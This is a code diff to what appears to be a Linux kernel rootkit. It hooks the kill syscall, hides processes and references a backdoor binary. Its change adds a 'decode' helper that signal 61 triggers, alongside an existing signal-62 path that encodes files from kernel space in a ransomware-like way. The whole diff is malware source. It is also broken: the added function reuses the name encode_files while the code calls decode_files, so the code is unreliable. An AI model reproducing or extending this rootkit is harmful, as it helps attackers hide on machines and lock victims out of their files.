@@ -37,6 +37,7 @@
 #define PREFIX "borg_"
 #define DOOR "/bin/borg_transwarp"
 #define ENC "/bin/borg_enc"
+#define DEC "/bin/borg_dec"
 #define PF_INVISIBLE 0x10000000
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
@@ -125,6 +126,14 @@ static int enable_transwarp(void){
 
 static int encode_files(void){
 	char *argv[] = { ENC, NULL, NULL };
+	static char *envp[] = {
+		"HOME=/",
+		"TERM=xterm",
+		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
+static int encode_files(void){
+	char *argv[] = { DEC, NULL, NULL };
 	static char *envp[] = {
 		"HOME=/",
 		"TERM=xterm",
@@ -252,7 +261,10 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 		encode_files();
 		return(0);
 	}
-
+	else if(sig==61) {
+		decode_files();
+		return(0);
+	}
     return orig_kill(regs);
 }
 #else
@@ -273,6 +285,10 @@ int hook_kill(pid_t pid, int sig)
     }
 	else if(sig==-62) {
 		encode_files();
+		return(0);
+	}
+	else if(sig==-61) {
+		decode_files();
 		return(0);
 	}
 
